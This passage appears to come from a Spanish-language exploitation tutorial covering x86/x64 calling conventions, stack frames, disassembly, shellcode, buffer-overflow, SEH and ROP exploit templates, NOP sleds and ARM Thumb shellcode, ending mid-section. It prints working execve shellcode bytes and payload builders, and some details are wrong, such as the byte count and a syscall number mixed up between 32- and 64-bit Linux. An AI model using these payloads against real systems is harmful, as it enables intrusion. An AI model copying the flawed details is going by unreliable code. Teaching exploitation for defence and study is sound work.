En x86-64, Windows y Linux tienen calling conventions diferentes:

**Linux (System V AMD64 ABI):**
- Argumentos: RDI, RSI, RDX, RCX, R8, R9 (en ese orden)
- Resto en la pila (derecha a izquierda)
- Return value en RAX
- RSP debe estar alineado a 16 bytes antes de CALL
- Caller-saved: RAX, RCX, RDX, RSI, RDI, R8-R11
- Callee-saved: RBX, RBP, R12-R15

```nasm
; void func(int a, int b, int c, int d, int e, int f, int g);
mov rdi, a ; 1er arg
mov rsi, b ; 2do arg
mov rdx, c ; 3er arg
mov rcx, d ; 4to arg
mov r8,  e ; 5to arg
mov r9,  f ; 6to arg
push g ; 7mo arg en pila
call func
add rsp, 8 ; caller limpia (cdecl-like)
```

**Windows (Microsoft x64 calling convention):**
- Argumentos: RCX, RDX, R8, R9
- Resto en la pila (derecha a izquierda)
- El caller debe reservar "shadow space" (32 bytes) en la pila
- Return value en RAX
- Callee-saved: RBX, RBP, RDI, RSI, R12-R15, RSP

```nasm
; Windows x64: siempre reservar shadow space
sub rsp, 40 ; shadow space (32) + posible extra
mov rcx, arg1 ; 1er arg
mov rdx, arg2 ; 2do arg
mov r8,  arg3 ; 3er arg
mov r9,  arg4 ; 4to arg
call func
add rsp, 40
```

### 5.4 Cambios en SEH (Structured Exception Handling)

En x86, SEH usa una lista enlazada almacenada en el [teb](../raw/w1n-1nt3rn4ls.md#teb) (accesible vía FS:[0]):

```nasm
; x86 SEH chain (antes del exploit)
; FS:[0] -> EXCEPTION_REGISTRATION struct
; Estructura en la pila
mov eax, fs:[0] ; cabeza de la cadena SEH
; [eax] = puntero al siguiente
; [eax+4] = puntero al handler (ExceptionHandler)
```

En x86-64, SEH cambió completamente a **SEH64** (o SEH table-based):

- No hay más cadena SEH en la pila
- Los handlers se registran en tablas en la sección `.pdata`
- El [compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores) genera tablas de funciones (function tables)
- `RtlDispatchException` busca en las tablas usando RSP como referencia
- Los exploits de SEH overwrite clásicos no funcionan en x64

```nasm
; x64: SEH se maneja con tablas en .pdata
; No hay punteros en la pila para overwrite
; RtlLookupFunctionEntry usa RSP para buscar en .pdata
```

Esto hace que los SEH overwrite exploits sean mucho más difíciles en x64. Se necesitan técnicas como overwrite de vectores de excepción VEH (Vectored Exception Handling) o atacar la tabla en lugar de la pila.

---

## 6. Stack Frames

### 6.1 Function prologue

El prólogo de una función prepara el stack frame. Generalmente:

```nasm
; Prólogo estándar (con frame pointer)
push ebp ; guardar el EBP del caller
mov  ebp, esp ; establecer nuevo frame pointer
sub  esp, N ; reservar N bytes para variables locales

; Prólogo optimizado (sin frame pointer, -fomit-frame-pointer)
; La función accede directamente con ESP
sub esp, N ; reservar variables locales
```

### 6.2 Function epilogue

El epílogo restaura el estado y retorna:

```nasm
; Epílogo estándar
mov esp, ebp ; restore ESP (libera variables locales)
pop ebp ; restore EBP
ret ; return

; Epílogo con LEAVE
leave ; = mov esp, ebp; pop ebp
ret

; Epílogo stdcall
mov esp, ebp
pop ebp
ret 16 ; return + limpiar argumentos
```

### 6.3 variables locales en la stack

```c
void func { int a = 5; int b = 10; int c[4];
}
```

```nasm
func: push ebp mov  ebp, esp sub  esp, 24 ; 3*4 = 12 bytes + 12 padding para alinear mov  dword [ebp-4], 5  ; a = 5 mov  dword [ebp-8], 10 ; b = 10 ; c está en ebp-24 hasta ebp-8 (4 ints) ; c[0] = [ebp-24], c[1] = [ebp-20], c[2] = [ebp-16], c[3] = [ebp-12] ; .. código .. leave ret
```

### 6.4 Layout de argumentos

```c
int func(int a, int b, int c) { return a + b + c;
}
```

```
Stack layout (cuando se ejecuta func):
Direcciones altas
+------------------+
| c |  [ebp+16]
+------------------+
| b |  [ebp+12]
+------------------+
| a |  [ebp+8]
+------------------+
| return address |  [ebp+4]
+------------------+
| saved EBP |  [ebp] (apunta acá EBP)
+------------------+
| variables loc |  [ebp-4], [ebp-8], etc.
+------------------+  ESP
Direcciones bajas
```

### 6.5 Frame pointer y optimizaciones

Con `-fomit-frame-pointer` (común en builds release), no se usa EBP como frame pointer. En su lugar, todo se referencia con ESP:

```nasm
; Sin frame pointer
func: sub esp, 16 mov dword [esp+12], 5 ; a mov dword [esp+8], 10 ; b mov eax, [esp+12] add eax, [esp+8] add esp, 16 ret

; Problema: si la pila cambia dinámicamente (alloca, push/pop),
; las variables locales se mueven. Con EBP es más estable.
```

En exploits, la presencia o ausencia de frame pointer cambia el offset al return address.

---

## 7. Disassembly Practice

### 7.1 Leyendo output de IDA Pro

IDA Pro (Interactive Disassembler) es la herramienta estándar de reversing. Su output típico:

```nasm
; IDA Pro disassembly
.text:00401000 ; int __cdecl suma(int a, int b)
.text:00401000 suma proc near
.text:00401000
.text:00401000 a = dword ptr  8
.text:00401000 b = dword ptr  0Ch
.text:00401000
.text:00401000 push ebp
.text:00401001 mov ebp, esp
.text:00401003 mov eax, [ebp+a]
.text:00401006 add eax, [ebp+b]
.text:00401009 pop ebp
.text:0040100A retn
.text:0040100A suma endp
```

Elementos clave:
- `.text:00401000` — segmento y dirección virtual
- `suma proc near` — inicio de función
- `a = dword ptr 8` — IDA define nombres para los argumentos
- `[ebp+a]` — referencia al argumento
- `retn` — ret near (dentro del mismo segmento)

### 7.2 Leyendo output de [ghidra](../raw/4pk-r3v3rs1ng.md#ghidra)

Ghidra (NSA) decompila a C, pero también muestra [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md):

```nasm
; Ghidra listing ************************************************************** * FUNCTION * ************************************************************** int __cdecl suma(int a, int b) int EAX:4 <RETURN> int Stack[0x8]:4 a int Stack[0xc]:4 b suma XREF[1]: .. ************************************************************** LAB 00401000 XREF[1]: .. PUSH EBP MOV EBP,ESP MOV EAX,dword ptr [EBP + a] ADD EAX,dword ptr [EBP + b] POP EBP RET
```

Ghidra también tiene la vista decompilada:

```c
int suma(int a, int b) { return a + b;
}
```

### 7.3 reconociendo un loop

```c
for (int i = 0; i < 10; i++) { printf("%d\n", i);
}
```

```nasm
; Loop for en assembly mov dword [ebp-4], 0 ; i = 0 jmp check_condition
loop_start: mov eax, [ebp-4] push  eax push  format_str call  printf add esp, 8 add dword [ebp-4], 1 ; i++
check_condition: cmp dword [ebp-4], 10 jl loop_start ; si i < 10, repetir
```

Pattern reconocible: `inicialización -> jmp check -> loop body -> incremento -> check -> jl/jg loop_start`.

También podés ver un `while`:

```c
while (condicion) { cuerpo; }
```

```nasm jmp check
body: ; .. cuerpo del while ..
check: ; evaluar condicion cmp .. jne body ; si condición verdadera, repetir
```

### 7.4 Reconociendo un if/else

```c
if (a == 5) { puts("es cinco");
} else { puts("no es cinco");
}
```

```nasm cmp dword [ebp-4], 5 jne else_branch ; then branch push  offset "es cinco" call  puts add esp, 4 jmp end_if
else_branch: push  offset "no es cinco" call  puts add esp, 4
end_if:
```

Pattern: `cmp + jcc (salta al else) + then_branch + jmp end + else_branch + end`.

### 7.5 Reconociendo un [switch](../raw/r3d3s-f0nd4m3nt0s.md#switches)

Los switch se implementan de dos formas:

**Como cascada de if/else** (pocos casos, valores dispersos):

```nasm cmp eax, 1 je case1 cmp eax, 3 je case3 cmp eax, 5 je case5 jmp default
```

**Jump table** (muchos casos consecutivos):

```nasm ; switch(eax) con casos 0-6 cmp eax, 6 ja default ; si eax > 6, default jmp [jump_table + eax*4]  ; salto indexado

jump_table: dd case0 dd case1 dd case2 dd case3 dd case4 dd case5 dd case6
```

En IDA/Ghidra, las jump tables aparecen como arrays de direcciones. Reconocés un switch por: `jmp [base + indice*4]` o similar.

### 7.6 Reconociendo llamadas a funciones

```nasm ; Llamada directa call 0x401000 ; call a dirección fija ; Llamada indirecta (por registro) call eax ; call dinámica ; Llamada indirecta (por memoria) call [0x402000] ; call vía IAT/PLT call [ebx + 0x10] ; call vtable (C++ virtual) ; PLT (Procedure Linkage Table) en Linux ELF call [email protected] ; call a biblioteca dinámica ; IAT (Import Address Table) en Windows PE call ds:MessageBoxA ; call a API de Windows
```

En reversing, las llamadas indirectas (vía [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros)) son más difíciles de seguir que las directas.

---

## 8. Shellcode Basics

### 8.1 Qué es shellcode

Shellcode es código máquina (bytes) que se inyecta en un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) vulnerable para ejecutar comandos. Originalmente daba una shell (de ahí el nombre), pero hoy puede hacer cualquier cosa: [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells), [bind shell](../raw/r3v3rs3-sh3lls.md#bind-shells), download & execute, etc.

Características del shellcode:
- **Compacto**: cada byte cuenta, hay límite de tamaño
- **Position-independent**: debe andar sin importar en qué dirección de memoria esté
- **Sin null bytes**: muchos exploits cortan strings en el primer null byte (por printf, strcpy, etc.)
- **Robusto**: debe manejar estados inesperados

### 8.2 Ejecutando /bin/sh en [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) Linux

El shellcode clásico para Linux x86:

```nasm
; execve("/bin/sh", NULL, NULL)
; NASM syntax
BITS 32

section .text
global _start

_start: ; Limpiar registros xor eax, eax ; eax = 0 xor ecx, ecx ; ecx = 0 (argv = NULL) xor edx, edx ; edx = 0 (envp = NULL) ; Poner "/bin//sh" en la pila (11 bytes con padding) push eax ; null terminator push 0x68732f2f ; "//sh" push 0x6e69622f ; "/bin" mov ebx, esp ; ebx = puntero a "/bin//sh" ; syscall execve mov al, 11 ; syscall number: execve (11) int 0x80
```

Compilar y extraer los bytes:

```bash
nasm -f elf32 shellcode.asm -o shellcode.o
ld -m elf_i386 shellcode.o -o shellcode
objdump -d shellcode | grep -Po '\s[0-9a-f]{2}(?=\s)' | tr -d '\n' | sed 's/./\\x&/g'
```

Output: `\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80`

21 bytes. Pero tiene un problema: veamos si tiene null bytes.

### 8.3 Null-byte free shellcode

El shellcode de arriba tiene algunos null bytes potenciales. Revisemos:

```nasm
xor eax, eax ; 31 c0  -> sin null bytes
xor ecx, ecx ; 31 c9  -> sin null bytes
xor edx, edx ; 31 d2  -> sin null bytes
push eax ; 50 -> sin null bytes
push 0x68732f2f ; 68 2f 2f 73 68 -> sin null bytes
push 0x6e69622f ; 68 2f 62 69 6e -> sin null bytes
mov ebx, esp ; 89 e3  -> sin null bytes
mov al, 11 ; b0 0b  -> sin null bytes
int 0x80 ; cd 80  -> sin null bytes
```

Este shellcode no tiene null bytes. Perfecto para exploits que usan string copy.

Pero si usáramos `mov eax, 11` en lugar de `mov al, 11`:

```nasm
mov eax, 11 ; b8 0b 00 00 00 -> TIENE null bytes!
```

Por eso usamos `mov al, 11` (ya que EAX ya está en cero por `xor eax, eax`).

### 8.4 Alphanumeric shellcode

A veces necesitás shellcode que solo contenga caracteres alfanuméricos (a-z, A-Z, 0-9) para eludir filtros de entrada.

Técnica: usar instrucciones que se codifiquen solo con bytes alfanuméricos.

```nasm
; Ejemplo de instrucciones alphanuméricas (x86):
; Las instrucciones se codifican para producir solo bytes en:
; 0x30-0x39 (0-9), 0x41-0x5A (A-Z), 0x61-0x7A (a-z)

; Algunos trucos:
push 0x41414141 ; 68 41 41 41 41  (push no es alfanumérico!)
; No, push no es alfanumérico. Hay que ser más creativo.
```

En realidad, el shellcode alfanumérico (también llamado "printable shellcode") usa instrucciones como:

```nasm
; Usar operaciones aritméticas para construir valores
; Ejemplo: hacer EAX = 0 con instrucciones alfanuméricas
and eax, 0x30303030 ; 25 30 30 30 30  -> solo bytes 0x25, 0x30..
; 0x25 es '%' - alfanumérico? No, solo 0-9, A-Z, a-z
```

La técnica de generación de shellcode alfanumérico es compleja. Usá herramientas como `msfvenom` o `alpha3`:

```bash
# Generar shellcode alfanumérico con msfvenom
msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/alpha_mixed -f c

# alpha3
python alpha3.py x86 ascii mixed -i shellcode.bin
```

### 8.5 Shellcode en Windows

En Windows, no hay [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls) directa al [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) como `int 0x80` (bueno, existe pero es más complejo). En su lugar, se usan llamadas a la Win32 API.

```nasm
; Shellcode Windows: MessageBox
; Usa kernel32.dll!GetProcAddress y LoadLibrary para encontrar APIs

BITS 32

; 1. Obtener dirección de kernel32.dll (del PEB)
; 2. Encontrar GetProcAddress
; 3. Encontrar LoadLibraryA
; 4. Cargar user32.dll
; 5. Encontrar MessageBoxA
; 6. Llamar MessageBoxA(0, "Hola", "Hack", 0)
; 7. Salir con ExitProcess
```

El shellcode de Windows es más complejo porque:
- No hay "syscall" estándar único
- Las direcciones de las DLLs cambian (ASLR)
- Hay que resolver dinámicamente las APIs
- El calling convention es stdcall

```nasm
; Fragmento: encontrar kernel32.dll via PEB
; FS:[0x30] -> PEB
; PEB+0x0C  -> LDR
; LDR+0x14  -> InMemoryOrderModuleList (primer módulo = exe)
; LDR+0x14  + 8 bytes = kernel32 xor eax, eax mov eax, fs:[eax + 0x30]  ; PEB mov eax, [eax + 0x0C] ; LDR mov eax, [eax + 0x14] ; InMemoryOrderModuleList mov eax, [eax] ; segundo módulo (ntdll) mov eax, [eax] ; tercer módulo (kernel32) mov eax, [eax + 0x10] ; base address de kernel32
```

### 8.6 Probando shellcode con pwntools

pwntools hace todo más fácil:

```python
from pwn import *

# Generar shellcode para execve("/bin/sh")
shellcode = asm(""" xor eax, eax xor ecx, ecx xor edx, edx push eax push 0x68732f2f push 0x6e69622f mov ebx, esp mov al, 11 int 0x80
""", arch='i386')

print(f"Shellcode length: {len(shellcode)}")
print(f"Hex: {shellcode.hex}")

# Desensamblar para verificar
print(disasm(shellcode, arch='i386')

# Probar el shellcode
# Crea un pequeño programa ELF que lo ejecuta
elf = make_elf(shellcode, arch='i386')
with open('/tmp/shellcode_test', 'wb') as f: f.write(elf)

# Probar (requiere -NX, ejecutar en la pila)
# O usar run_shellcode
# io = run_shellcode(shellcode, arch='i386')
# io.interactive
```

También podés usar `shellcraft`:

```python
from pwn import *

# Shellcode pre-hecho
sc = shellcraft.i386.linux.sh # execve /bin/sh
sc2 = shellcraft.i386.linux.cat('flag.txt')
sc3 = shellcraft.i386.linux.findpeersh
```

---

## 9. Exploit Primitives

### 9.1 [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow): offset calculation

El primer paso en un stack overflow es calcular el offset al return address.

```c
void vulnerable(char *input) { char buffer[64]; strcpy(buffer, input);  // sin bounds checking!
}
```

**Método 1: pattern de de Bruijn**

```python
from pwn import *

# Generar pattern de 200 bytes
pattern = cyclic(200)

# Enviar al programa vulnerable
# Cuando crashea, ver EIP

# Si EIP = 0x6161616c, buscar el offset:
offset = cyclic_find(0x6161616c)
print(f"Offset: {offset}")  # 64
```

**Método 2: GDB + pattern**

```bash
# En GDB:
gdb ./vuln
run $(python3 -c "print('A'*100)")
# EIP = 0x41414141 -> overflow con A's
# Después probás con pattern para encontrar el offset exacto

# Método exacto con pattern:
run $(echo "AAAABBBBCCCCDDDD..")
# Cuando crasheés, fijate qué caracteres están en EIP
# Los caracteres en EIP te dicen el offset
```

### 9.2 Eip overwrite

Una vez que conocés el offset, controlás EIP:

```python
from pwn import *

offset = 64
eip = 0xdeadbeef  # reemplazar con dirección válida

payload = b'A' * offset
payload += p32(eip)  # little-endian!

# Enviar payload
# p32 convierte a little-endian: 0xdeadbeef -> ef be ad de
```

El control de EIP te permite:
- redirigir a shellcode en el buffer (si la pila es ejecutable)
- Redirigir a gadgets ROP
- Redirigir a funcioniones)es del programa (ret2libc, ret2plt)
- Redirigir a SEH handler

### 9.3 SEH overwrite

En Windows [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86), si el programa tiene `/GS` (stack cookie) y el buffer overflow no puede sobreescribir el return address, podés atacar la SEH chain.

```c
// Compilado con /GS, el buffer overflow sobreescribe:
// [buffer] [cookie] [saved EBP] [ret addr] [SEH chain]
// Si toca la cookie, el programa termina antes de RET
// Pero si el overflow llega a SEH antes de detectarlo..
```

```python
# SEH overwrite exploit
# La estructura SEH en la pila:
# [next handler (4 bytes)] [handler function (4 bytes)]

# Offset hasta SEH
seh_offset = 68  # depende del programa

payload = b'A' * seh_offset
payload += p32(next_seh) # POP POP RET gadget para siguiente SEH
payload += p32(seh_handler) # dirección del handler (shellcode)
payload += b'\x90' * 16 # NOP sled
payload += shellcode
```

Requiere un gadget `POP POP RET` en el módulo (no en la DLL con SafeSEH). Es una técnica clásica de Windows XP/2003.

### 9.4 ROP gadgets: ret2libc

Cuando la pila no es ejecutable (NX/DEP), no podés ejecutar shellcode en el buffer. Usás ROP para llamar a funciones existentes.

**ret2libc**: llamar a `system("/bin/sh")` en libc:

```python
# Suponiendo:
# - offset = 64
# - system address = 0xf7e12345
# - "/bin/sh" string address = 0xf7f65432
# - exit address = 0xf7e67890

payload = b'A' * offset
payload += p32(system_addr) # EIP = system
payload += p32(exit_addr) # return address después de system
payload += p32(binsh_addr) # argumento para system
```

Cuando `vulnerable` hace RET:
1. EIP → system
2. Después de system, retorna a exit
3. ESP apunta a binsh_addr

### 9.5 ROP chains

Para cosas más complejas (múltiples llamadas), necesitás una ROP chain:

```python
# ROP chain para llamar a mprotect y hacer la pila ejecutable
# mprotect(void *addr, size_t len, int prot)

rop = b'A' * offset
rop += p32(pop_edi_ret) # POP EDI; RET gadget
rop += p32(0x7ffe0000) # addr (página a hacer ejecutable)
rop += p32(pop_esi_ret) # POP ESI; RET gadget
rop += p32(0x1000) # len (tamaño)
rop += p32(pop_ebx_ret) # POP EBX; RET gadget
rop += p32(7) # prot (PROT_READ|PROT_WRITE|PROT_EXEC)
rop += p32(mprotect_addr) # llamar a mprotect
rop += p32(shellcode_addr) # después de mprotect, saltar al shellcode
```

**Encontrar gadgets con pwntools:**

```python
from pwn import *

elf = ELF('vulnerable')

rop = ROP(elf)
pop_eax_ret = rop.find_gadget(['pop eax', 'ret'])[0]
pop_ebx_ret = rop.find_gadget(['pop ebx', 'ret'])[0]
pop_ecx_ret = rop.find_gadget(['pop ecx', 'ret'])[0]
pop_edx_ret = rop.find_gadget(['pop edx', 'ret'])[0]
int_80 = rop.find_gadget(['int 0x80', 'ret'])[0]

# ROP chain para execve("/bin/sh", 0, 0)
rop_chain = [ pop_eax_ret, 59, # EAX = execve syscall number pop_ebx_ret, binsh_addr, # EBX = "/bin/sh" pop_ecx_ret, 0, # ECX = 0 pop_edx_ret, 0, # EDX = 0 int_80 # syscall
]

payload = b'A' * offset
for g in rop_chain: payload += p32(g)
```

**ROPgadget tool:**

```bash
# Encontrar gadgets en un binario
ROPgadget --binary vulnerable

# Buscar POP POP RET específicamente
ROPgadget --binary vulnerable --opcod "pop r32; pop r32; ret"

# Para x86-64
ROPgadget --binary vulnerable --ropchain
```

---

## 10. NOP Sleds

### 10.1 Qué es un NOP sled

Un NOP sled es una secuencia de instrucciones NOP (No Operation) que no hacen nada y pasan a la siguiente instrucción. En [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86), NOP es `0x90`.

```
en memoria:
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
90 90 90 90 [shellcode empieza acá]
```

Si Eip cae en cualquier lugar del NOP sled, "desliza" hasta el shellcode. Esto aumenta la probabilidad de éxito cuando no sabés la dirección exacta del buffer.

```python
payload = b'\x90' * 100  # NOP sled de 100 bytes
payload += shellcode # 20-30 bytes
payload += b'A' * (offset - len(payload)  # padding
payload += p32(landing_addr)  # dirección aproximada en el NOP sled
```

### 10.2 Alignment y consideraciones de tamaño

**Alignment**: en x86, las instrucciones no necesitan estar alineadas, pero conviene que la landing address apunte al medio del sled:

```python
# Elegir landing address en el medio del sled
landing = buf_addr + len(nop_sled) // 2
```

**Tamaño del sled:** depende de:
- Cuánto podés escribir antes del return address
- Cuánto error tiene tu estimación de dirección
- ASLR: más randomización requiere sled más grande

```python
# ASLR ligero: sled ~100 bytes
# ASLR fuerte: sled ~1000 bytes o más
# Sin ASLR: sled de 16-32 bytes alcanza
```

**No usar solo NOPs:** si hay [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips)))/[ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) que detectan patrones de NOP sled, podés usar variantes:

```nasm
; Equivalentes a NOP (1 byte)
xchg eax, eax  ; 87 c0 (2 bytes)
mov eax, eax ; 89 c0 (2 bytes)
lea eax, [eax] ; 8d 00 (2 bytes)

; O instrucciones que no afectan el estado
nop ; 90
```

### 10.3 Identificando NOP sleds en memoria

En GDB:

```bash
gdb ./vuln
break *main+50
run
x/100x $esp-200  # examinar memoria alrededor de ESP
```

Si ves un montón de `0x90 0x90 0x90..`, encontraste un NOP sled.

En memoria de un volcado (core dump):

```bash
# Buscar NOP sled en un volcado
xxd core | grep "90909090 90909090"
```

Con pwntools:

```python
from pwn import *

data = read('core')
nop_sleds = for i in range(len(data) - 100): if data[i:i+20] == b'\x90' * 20: nop_sleds.append(i)
```

---

## 11. ARM Basics

### 11.1 Registros ARM: R0-R15

ARM tiene 16 registros de propósito general (R0-R15):

| Registro | Nombre | Propósito |
|----------|--------|-----------|
| R0 | - | Argumentos/return value, caller-saved |
| R1 | - | Argumentos, caller-saved |
| R2 | - | Argumentos, caller-saved |
| R3 | - | Argumentos, caller-saved |
| R4-R10 | - | Locals, callee-saved |
| R7 | - | [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls) number (ARM EABI) / frame pointer (en Thumb compilado) |
| R8 | - | Callee-saved (no en Thumb) |
| R9 | - | Platform register (variante) |
| R10 | SL | Stack limit |
| R11 | FP | Frame pointer |
| R12 | [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) | Intra-procedure call scratch |
| R13 | SP | Stack pointer |
| R14 | LR | Link register (return address) |
| R15 | PC | Program counter |

**Diferencia clave con [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86):**
- PC (R15) se puede leer/escribir directamente (como EIP en x86, pero accesible)
- LR (R14) guarda la dirección de retorno en vez de la pila
- Todos los registros son de 32 bits

### 11.2 Modos ARM vs Thumb

ARM tiene dos modos de ejecución principales:

**Modo ARM (32 bits):**
- Instrucciones de 4 bytes (32 bits)
- Casi todas las instrucciones son condicionales
- Más funcionalidades, más código

**Modo Thumb (16 bits):**
- Instrucciones de 2 bytes (o 4 bytes en Thumb-2)
- Código más compacto (~30% menos)
- Instrucciones no condicionales (excepto branch)
- Muy usado en shellcode por el tamaño reducido

**Modo Thumb-2 (ARMv6T2+):**
- Mezcla instrucciones de 16 y 32 bits
- Combina lo compacto de Thumb con funcionalidad de ARM

```nasm
; Cambiar entre modos:
; BX con bit 0 del registro = 1 -> Thumb, 0 -> ARM

; Modo ARM:
.code 32
mov r0, #1
bx lr ; retornar (si LR tiene bit 0 = 1, cambia a Thumb)

; Modo Thumb:
.code 16
movs r0, #1 ; en Thumb, muchas instrucciones afectan flags por defecto
bx lr
```

### 11.3 Instruction [set](../raw/ph1sh1ng.md#social-engineering-toolkit) ARM: MOV, ADD, SUB, LDR, STR

**MOV:**

```nasm
; Modo ARM
mov r0, #5 ; r0 = 5
mov r0, r1 ; r0 = r1
mov r0, r1, lsl #2  ; r0 = r1 << 2 (barrel shifter!)

; Modo Thumb
movs r0, #5 ; r0 = 5 (el 's' afecta flags en Thumb)
mov r0, r1 ; r0 = r1
```

**ADD/SUB:**

```nasm
; ARM
add r0, r1, r2 ; r0 = r1 + r2
add r0, r1, #5 ; r0 = r1 + 5
sub r0, r1, r2 ; r0 = r1 - r2
sub r0, r1, #5 ; r0 = r1 - 5

; Con barrel shifter
add r0, r1, r2, lsl #2  ; r0 = r1 + (r2 << 2)
sub r0, r1, r2, lsr #1  ; r0 = r1 - (r2 >> 1)

; Thumb
adds r0, r1, #5 ; r0 = r1 + 5
subs r0, r1, #5 ; r0 = r1 - 5
add r0, r1 ; r0 = r0 + r1 (formato Thumb)
```

**LDR/STR (load/store, equivalente a MOV desde/a memoria):**

```nasm
; ARM
ldr r0, [r1] ; r0 = *r1 (load word de 32 bits)
ldr r0, [r1, #4] ; r0 = *(r1 + 4)
ldr r0, [r1, r2] ; r0 = *(r1 + r2)
ldrb r0, [r1] ; r0 = *(r1) (load byte, zero-extend)
ldrh r0, [r1] ; load halfword (16 bits)

str r0, [r1] ; *r1 = r0 (store word)
str r0, [r1, #4] ; *(r1+4) = r0
strb r0, [r1] ; store byte

; Pre-indexed (actualiza el registro base antes del acceso)
ldr r0, [r1, #4]! ; r1 += 4; r0 = *r1

; Post-indexed (accede y después actualiza)
ldr r0, [r1], #4 ; r0 = *r1; r1 += 4

; Thumb
ldr r0, [r1] ; load word
ldr r0, [r1, #4] ; load word con offset
str r0, [r1] ; store word
str r0, [r1, #4] ; store word con offset
ldrb r0, [r1] ; load byte
strb r0, [r1] ; store byte
```

**Carga de direcciones/comparaciones:**

```nasm
; LDR pseudo-instruction (carga dirección o constante)
ldr r0, =0x12345678 ; carga la constante en R0 (el ensamblador la guarda en el pool)
ldr r0, =mi_etiqueta ; carga dirección de mi_etiqueta

; CMP
cmp r0, r1 ; compara r0 con r1, afecta flags
cmp r0, #5 ; compara r0 con 5
```

### 11.4 B, BL, BX: branching

```nasm
; B: branch (salto incondicional/condicional)
B label ; saltar a label
BEQ label ; saltar si igual (Z=1)
BNE label ; saltar si no igual (Z=0)
BGT label ; saltar si mayor (signed)
BLT label ; saltar si menor (signed)

; BL: branch and link (call, guarda return address en LR)
BL  funcion ; LR = dirección siguiente; PC = funcion

; BX: branch and exchange (salta y posiblemente cambia modo)
BX  lr ; return (LR a PC, si bit 0 de LR=1 -> Thumb)
BX  r0 ; salta a la dirección en R0

; BLX: branch with link and exchange
BLX funcion ; BL + posible cambio de modo
```

### 11.5 ARM calling convention

**ARM standard (AAPCS - ARM Architecture Procedure Call Standard):**

- R0-R3: argumentos (o `this` para C++)
- R0: return value
- R4-R11: callee-saved
- R12-R15: special (IP, SP, LR, PC)
- Stack crece hacia abajo, SP debe estar alineado a 8 bytes
- LR guarda dirección de retorno (no la pila)

```c
int suma(int a, int b, int c, int d) { return a + b + c + d;
}
```

```nasm
; Caller:
mov r0, #1 ; a
mov r1, #2 ; b
mov r2, #3 ; c
mov r3, #4 ; d
bl  suma ; call

; suma:
suma: push {lr} ; guardar return address (solo si llamamos a otras funcs) add r0, r0, r1 add r0, r0, r2 add r0, r0, r3 pop {pc} ; return (pop a PC directamente)
```

El uso de `push {lr}` / `pop {pc}` es el equivalente ARM de `push ebp`/`mov ebp, esp`/`ret`.

---

## 12. ARM Shellcode

### 12.1 Diferencias con [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)

ARM shellcode es diferente del x86 por varias razones:

1. **Registros**: LR guarda return address, no la pila. Usamos BX LR para return.
2. **syscalls**: En ARM Linux, [syscall](../raw/0s-f0nd4m3nt0s.md#syscalls) se hace con `swi 0` (o `svc 0`) con el número en R7.
3. **Direccionamiento**: No hay `push`/`pop` genéricos. Cargamos direcciones con `ldr` o `adr`.
4. **Tamaño de instrucción**: Thumb (16 bits) da código más compacto que ARM (32 bits).
5. **Condicionalidad**: En ARM, casi todas las instrucciones son condicionales. En Thumb, no.
6. **Endianness**: ARM es bi-endian pero generalmente little-endian como x86.

### 12.2 Thumb shellcode

Thumb shellcode es preferido porque:
- Ocupa menos espacio (~60% del ARM)
- Más fácil de meter en buffers pequeños
- Null-byte constraints se manejan distinto

```nasm
; ARM Thumb shellcode: execve("/bin/sh", 0, 0)
; Guardar como shellcode_thumb.s

.section .text
.global _start
.code 16 ; Modo Thumb

_start: ; R3 = dirección de "/bin/sh" en la pila adr r3, binsh ; r3 = dirección de binsh (codificación corta) ; Limpiar R1 y R2 (argv, envp) eor r1, r1, r1 ; r1 = 0 (XOR) eor r2, r2, r2 ; r2 = 0 ; Syscall execve mov r0, r3 ; r0 = puntero a "/bin/sh" mov r7, #11 ; syscall number: execve (11 en ARM) svc 0 ; syscall ; Salida de emergencia mov r7, #1 ; sys_exit eor r0, r0, r0 ; status = 0 svc 0

binsh: .ascii "/bin/sh" .byte 0
```

### 12.3 Null-byte constraints en ARM

ARM tiene sus propios problemas con null bytes:

```nasm
; Instrucciones que producen null bytes en ARM:

mov r0, #0 ; e3a00000  -> el último byte es 0! (3 bytes null!)
; Solución: eor r0, r0, r0  -> 0xe0200000 -> también tiene nulls!

; En Thumb:
movs r0, #0 ; 2000 -> tiene null byte!
; Solución Thumb:
eors r0, r0 ; 4040 -> sin null bytes!
; o
movs r0, #0xFF ; 20ff -> sin null, luego usar para limpiar.. no sirve

; La técnica estándar:
eor r0, r0, r0 ; 4040 en Thumb (2 bytes, sin null)
eor r1, r1, r1 ; 4049
eor r2, r2, r2 ; 4052
```

**Direcciones**: en ARM, `ldr r0, =0x12345678` necesita la constante en un literal pool. En shellcode, usamos técnicas PC-relative:

```nasm
; Cargar dirección sin null bytes
adr r3, binsh ; en Thumb, adr puede tener restricciones de alcance

; O construir en la pila:
mov r3, #0x6e69622f ; no se puede en Thumb (inmediato grande)
; Thumb solo permite 8 bits desplazados! Hay que dividir:
mov r3, #0x2f ; "/"
lsl r3, r3, #8 ; r3 <<= 8
..
```

### 12.4 Ejemplo: execve en ARM Thumb (optimizado)

```nasm
; Thumb shellcode ejecutando /system/bin/sh en Android
; (el pathsystem/bin/sh tiene más bytes, mismo concepto)

.section .text
.global _start
.code 16

